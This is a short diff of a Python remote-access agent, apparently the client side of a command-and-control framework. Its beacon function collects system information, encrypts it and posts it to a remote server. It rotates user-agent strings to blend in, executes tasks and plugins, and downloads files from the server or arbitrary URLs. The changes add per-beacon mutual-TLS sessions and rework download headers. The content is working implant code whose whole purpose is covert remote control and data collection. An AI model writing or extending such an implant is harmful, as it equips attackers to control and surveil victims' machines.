@@ -167,15 +167,23 @@ def login():
 
 
 def beacon():
+    global session
     headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
 
     payload = get_system_info()
 
     encrypted_payload = encrypt_data(json.dumps(payload))
+    # Create fresh session for this beacon
+    temp_session = requests.Session()
+    temp_session.verify = str(CA_CERT)
+    temp_session.cert = (
+        BASE_DIR / "keys" / f"agent{AGENT_ID}.crt",
+        BASE_DIR / "keys" / f"agent{AGENT_ID}.key",
+    )
 
     try:
 
-        response = session.post(
+        response = temp_session.post(
             SERVER_URL + BEACON_ENDPOINT,
             json={"data": encrypted_payload},
             headers=headers
@@ -212,6 +220,7 @@ def beacon():
 
     except Exception as e:
         print(f"[!] Beacon error: {e}")
+        return
 
 
 def execute_task(task, task_uuid):
@@ -492,8 +501,13 @@ def execute_plugin(content, module_name, task_uuid):
 def download_file(url, save_as=None, task_uuid=None):
     try:
         print(f"[+] Downloading {url}")
-        r = session.get(url)
+        headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
+        if SERVER_URL in url:
+            r = session.get(url,headers=headers)  # Uses your custom mTLS session
+        else:
+            r = requests.get(url)
         r.raise_for_status()
+
 
         if "/plugins" in url:
             content = r.text.replace("\r\n", "\n")
